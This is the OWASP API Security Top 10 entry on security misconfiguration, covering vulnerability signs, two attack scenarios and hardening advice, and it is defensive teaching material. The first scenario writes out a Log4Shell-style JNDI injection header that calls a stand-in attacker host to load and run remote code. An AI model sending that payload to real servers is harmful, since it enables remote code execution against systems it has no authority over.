# API8:2023 Security Misconfiguration

| Threat agents/Attack vectors | Security Weakness | Impacts |
| - | - | - |
| API Specific : Exploitability **Easy** | Prevalence **Widespread** : Detectability **Easy** | Technical **Severe** : Business Specific |
| Attackers will often attempt to find unpatched flaws, common endpoints, services running with insecure default configurations, or unprotected files and directories to gain unauthorized access or knowledge of the system. Most of this is public knowledge and exploits may be available. | Security misconfiguration can happen at any level of the API stack, from the network level to the application level. Automated tools are available to detect and exploit misconfigurations such as unnecessary services or legacy options. | Security misconfigurations not only expose sensitive user data, but also system details that can lead to full server compromise. |

## Is the API Vulnerable?

The API might be vulnerable if:

* Appropriate security hardening is missing across any part of the API stack,
  or if there are improperly configured permissions on cloud services
* The latest security patches are missing, or the systems are out of date
* Unnecessary features are enabled (e.g. HTTP verbs, logging features)
* There are discrepancies in the way incoming requests are processed by servers
  in the HTTP server chain
* Transport Layer Security (TLS) is missing
* Security or cache control directives are not sent to clients
* A Cross-Origin Resource Sharing (CORS) policy is missing or improperly set
* Error messages include stack traces, or expose other sensitive information

## Example Attack Scenarios

### Scenario #1

An API back-end server maintains an access log written by a popular third-party
open-source logging utility with support for placeholder expansion and JNDI
(Java Naming and Directory Interface) lookups, both enabled by default. For
each request, a new entry is written to the log file with the following
pattern: `<method> <api_version>/<path> - <status_code>`.

A bad actor issues the following API request, which gets written to the access
log file:

```
GET /health
X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
```

Due to the insecure default configuration of the logging utility and a
permissive network outbound policy, in order to write the corresponding entry
to the access log, while expanding the value in the `X-Api-Version` request
header, the logging utility will pull and execute the `Malicious.class` object
from the attacker's remote controlled server.

### Scenario #2

A social network website offers a "Direct Message" feature that allows users to
keep private conversations. To retrieve new messages for a specific
conversation, the website issues the following API request (user interaction is
not required):

```
GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA
```

Because the API response does not include the `Cache-Control` HTTP response
header, private conversations end-up cached by the web browser, allowing
malicious actors to retrieve them from the browser cache files in the
filesystem.

## How To Prevent

The API life cycle should include:

* A repeatable hardening process leading to fast and easy deployment of a
  properly locked down environment
* A task to review and update configurations across the entire API stack. The
  review should include: orchestration files, API components, and cloud
  services (e.g. S3 bucket permissions)
* An automated process to continuously assess the effectiveness of the
  configuration and settings in all environments

Furthermore:

* Ensure that all API communications from the client to the API server and any
  downstream/upstream components happen over an encrypted communication channel
  (TLS), regardless of whether it is an internal or public-facing API.
* Be specific about which HTTP verbs each API can be accessed by: all other
  HTTP verbs should be disabled (e.g. HEAD).
* APIs expecting to be accessed from browser-based clients (e.g., WebApp
  front-end) should, at least:
    * implement a proper Cross-Origin Resource Sharing (CORS) policy
    * include applicable Security Headers
* Restrict incoming content types/data formats to those that meet the business/
  functional requirements.
* Ensure all servers in the HTTP server chain (e.g. load balancers, reverse
  and forward proxies, and back-end servers) process incoming requests in a
  uniform manner to avoid desync issues.
* Where applicable, define and enforce all API response payload schemas,
  including error responses, to prevent exception traces and other valuable
  information from being sent back to attackers.

## References

### OWASP

* [OWASP Secure Headers Project][1]
* [Configuration and Deployment Management Testing - Web Security Testing
  Guide][2]
* [Testing for Error Handling - Web Security Testing Guide][3]
* [Testing for Cross Site Request Forgery - Web Security Testing Guide][4]

### External

* [CWE-2: Environmental Security Flaws][5]
* [CWE-16: Configuration][6]
* [CWE-209: Generation of Error Message Containing Sensitive Information][7]
* [CWE-319: Cleartext Transmission of Sensitive Information][8]
* [CWE-388: Error Handling][9]
* [CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response
  Smuggling')][10]
* [CWE-942: Permissive Cross-domain Policy with Untrusted Domains][11]
* [Guide to General Server Security][12], NIST
* [Let's Encrypt: a free, automated, and open Certificate Authority][13]

[1]: https://owasp.org/www-project-secure-headers/
[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README
[3]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README
[4]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery
[5]: https://cwe.mitre.org/data/definitions/2.html
[6]: https://cwe.mitre.org/data/definitions/16.html
[7]: https://cwe.mitre.org/data/definitions/209.html
[8]: https://cwe.mitre.org/data/definitions/319.html
[9]: https://cwe.mitre.org/data/definitions/388.html
[10]: https://cwe.mitre.org/data/definitions/444.html
[11]: https://cwe.mitre.org/data/definitions/942.html
[12]: https://csrc.nist.gov/publications/detail/sp/800-123/final
[13]: https://letsencrypt.org/
